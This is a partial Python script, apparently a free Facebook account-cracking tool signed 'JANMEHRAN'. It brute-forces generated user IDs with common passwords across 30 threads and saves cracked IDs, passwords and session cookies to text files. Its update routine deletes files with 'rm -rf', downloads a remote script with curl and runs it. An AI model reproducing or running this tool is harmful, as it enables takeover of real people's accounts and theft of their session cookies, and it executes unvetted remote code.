...
--------------------------------------------------
[•]\033[1;32mCREATED BY   : \033[1;32mJANMEHRAN\033[1;32m
[•]\033[1;32mFACEBOOK     : \033[1;32mJANMEHRAN\033[1;32m
[•]\033[1;32mYOUTUBE      : \033[1;32mJANMEHRAN\033[1;32m
[•]\033[1;32mAUTHOR       : \033[1;32mJANMEHRAN \033[1;32m
[•]\033[1;32mSTATUS       : \033[1;32mFREE\033[1;32m
--------------------------------------------------
[•] \033[1;32mVERSION    :\033[1;32m 1.0.4 \033[1;32m"𝑳𝑶𝑽𝑬 JANMEHRAN"\033[1;32m
--------------------------------------------------"""
...
try:
    ...
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/ali-JUTT/ali/main/lD_Facebook.py > lD_Facebook.py')
        os.system('python lD_Facebook.py')
    else:pass
...
def svn_digit():
	...
	os.system('clear')
	print(logo)
	print('[•] EXAMPLE :93718,93745,93823,93706.ETC')
	lines()
...
def ali_khan():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'khankhan','khan1122','khan12','khan123','khan786','afghanistan','pubgking','AFGHAN','۵٠٠۶٠٠','۱٠٠٠۲٠٠٠']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[JANMEHRAN-0K] '+cid+'|'+ps+'\033[0;97m\n[‎‎JANMEHRAN]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('JANMEHRAN-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[JANMEHRAN-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('JANMEHRAN-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mJANMEHRAN\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923148007918?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
